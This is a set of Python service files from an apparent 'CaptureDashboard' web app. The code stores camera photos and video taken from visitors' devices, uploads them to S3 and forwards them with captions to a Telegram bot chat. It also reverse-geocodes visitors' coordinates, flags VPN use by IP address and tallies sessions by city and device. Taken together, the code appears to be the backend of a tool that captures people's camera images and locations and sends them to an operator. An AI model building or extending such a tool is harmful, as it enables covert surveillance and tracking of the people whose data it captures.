F["app/services/telegram.py"] = "import requests\nimport time\nfrom app.config import Config\n\ndef _base():\n    return 'https://api.telegram.org/bot' + Config.TG_TOKEN\n\ndef _check():\n    return Config.TG_TOKEN and 'ISI_' not in Config.TG_TOKEN\n\ndef _post_with_retry(url, **kwargs):\n    for attempt in range(4):\n        try:\n            r = requests.post(url, timeout=30, **kwargs)\n            j = r.json()\n            if j.get('ok'):\n                return True, ''\n            desc = j.get('description', '')\n            if 'Too Many Requests' in desc or r.status_code == 429:\n                time.sleep(2 ** attempt)\n                continue\n            return False, desc\n        except Exception as e:\n            if attempt < 3:\n                time.sleep(2 ** attempt)\n                continue\n            return False, str(e)\n    return False, 'retry exhausted'\n\ndef send_photo(image_bytes, caption, filename='foto.png'):\n    if not _check(): return False, 'token belum diisi'\n    return _post_with_retry(_base() + '/sendPhoto', data={'chat_id': Config.TG_CHAT_ID, 'caption': caption}, files={'photo': (filename, image_bytes, 'image/png')})\n\ndef send_video(video_bytes, caption, filename='video.webm'):\n    if not _check(): return False, 'token belum diisi'\n    if len(video_bytes) > 50 * 1024 * 1024:\n        return send_text('Video terlalu besar')\n    return _post_with_retry(_base() + '/sendVideo', data={'chat_id': Config.TG_CHAT_ID, 'caption': caption}, files={'video': (filename, video_bytes, 'video/webm')})\n\ndef send_text(text):\n    if not _check(): return False\n    ok, _ = _post_with_retry(_base() + '/sendMessage', json={'chat_id': Config.TG_CHAT_ID, 'text': text})\n    return ok\n"

F["app/services/storage.py"] = "import os\nimport base64\nfrom app.config import Config\n\ndef save_bytes(ts, suffix, data):\n    fname = ts + '_' + suffix + '.png'\n    path = os.path.join(Config.UPLOAD_DIR, fname)\n    with open(path, 'wb') as f:\n        f.write(data)\n    if Config.USE_S3 and Config.S3_BUCKET:\n        try:\n            import boto3\n            s3 = boto3.client('s3', endpoint_url=Config.S3_ENDPOINT, aws_access_key_id=Config.S3_ACCESS_KEY, aws_secret_access_key=Config.S3_SECRET_KEY)\n            s3.upload_file(path, Config.S3_BUCKET, fname, ExtraArgs={'ContentType': 'image/png'})\n        except Exception as e:\n            print('[S3 err]', e)\n    return fname\n\ndef save_video(ts, data):\n    fname = ts + '_video.webm'\n    path = os.path.join(Config.UPLOAD_DIR, fname)\n    with open(path, 'wb') as f:\n        f.write(data)\n    return fname\n\ndef delete_session_files(ts):\n    if not os.path.isdir(Config.UPLOAD_DIR):\n        return\n    for f in os.listdir(Config.UPLOAD_DIR):\n        if f.startswith(ts):\n            try: os.remove(os.path.join(Config.UPLOAD_DIR, f))\n            except Exception: pass\n\ndef decode_data_url(data_url):\n    if not data_url or ',' not in data_url: return b''\n    try:\n        return base64.b64decode(data_url.split(',', 1)[1])\n    except Exception:\n        return b''\n\ndef disk_usage_mb():\n    total = 0\n    for root, _, files in os.walk(Config.UPLOAD_DIR):\n        for f in files:\n            total += os.path.getsize(os.path.join(root, f))\n    return total / (1024 * 1024)\n"

F["app/services/geo.py"] = "import requests\nimport json\nfrom app.config import Config\nfrom app.tasks import get_redis\n\ndef _cache_get(key):\n    r = get_redis()\n    if not r: return None\n    try:\n        v = r.get(key)\n        return json.loads(v) if v else None\n    except Exception:\n        return None\n\ndef _cache_set(key, value, ttl=86400):\n    r = get_redis()\n    if not r: return\n    try:\n        r.setex(key, ttl, json.dumps(value))\n    except Exception:\n        pass\n\ndef reverse_geocode(lat, lon):\n    if not Config.ENABLE_REVERSE_GEOCODE or not lat or not lon:\n        return ''\n    key = 'geo:' + str(round(lat, 4)) + ':' + str(round(lon, 4))\n    cached = _cache_get(key)\n    if cached is not None:\n        return cached\n    try:\n        r = requests.get('https://nominatim.openstreetmap.org/reverse', params={'lat': lat, 'lon': lon, 'format': 'json'}, headers={'User-Agent': 'CaptureDashboard/1.0'}, timeout=8)\n        addr = r.json().get('display_name', '')\n        _cache_set(key, addr, ttl=86400 * 7)\n        return addr\n    except Exception:\n        return ''\n\ndef check_vpn(ip):\n    if not Config.ENABLE_VPN_CHECK or not ip:\n        return False\n    key = 'vpn:' + ip\n    cached = _cache_get(key)\n    if cached is not None:\n        return cached\n    try:\n        r = requests.get('https://proxycheck.io/v2/' + ip + '?vpn=1&asn=1', timeout=8)\n        info = r.json().get(ip, {})\n        result = info.get('proxy', 'no') == 'yes'\n        _cache_set(key, result, ttl=3600)\n        return result\n    except Exception:\n        return False\n"

F["app/services/analytics.py"] = "from app.database import db\nfrom app.models import Session as SessionModel\nfrom collections import Counter\nfrom datetime import datetime, timedelta\n\ndef summary():\n    total = SessionModel.query.count()\n    with_photo = SessionModel.query.filter(db.or_(SessionModel.has_depan == 1, SessionModel.has_belakang == 1)).count()\n    today_start = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)\n    today = SessionModel.query.filter(SessionModel.created_at >= today_start).count()\n    cities = Counter(r.city for r in SessionModel.query.filter(SessionModel.city.isnot(None)).all() if r.city).most_common(5)\n    devices = Counter()\n    for r in SessionModel.query.with_entities(SessionModel.user_agent).all():\n        ua = (r[0] or '').lower()\n        if 'android' in ua: devices['Android'] += 1\n        elif 'iphone' in ua or 'ipad' in ua: devices['iOS'] += 1\n        elif 'windows' in ua: devices['Windows'] += 1\n        elif 'mac' in ua: devices['macOS'] += 1\n        elif 'linux' in ua: devices['Linux'] += 1\n        else: devices['Other'] += 1\n    timeline = []\n    for i in range(6, -1, -1):\n        day = (datetime.utcnow() - timedelta(days=i)).date()\n        start = datetime.combine(day, datetime.min.time())\n        end = start + timedelta(days=1)\n        n = SessionModel.query.filter(SessionModel.created_at >= start, SessionModel.created_at < end).count()\n        timeline.append({'date': day.isoformat(), 'count': n})\n    return {'total': total, 'with_photo': with_photo, 'today': today, 'cities': cities, 'devices': dict(devices), 'timeline': timeline}\n"

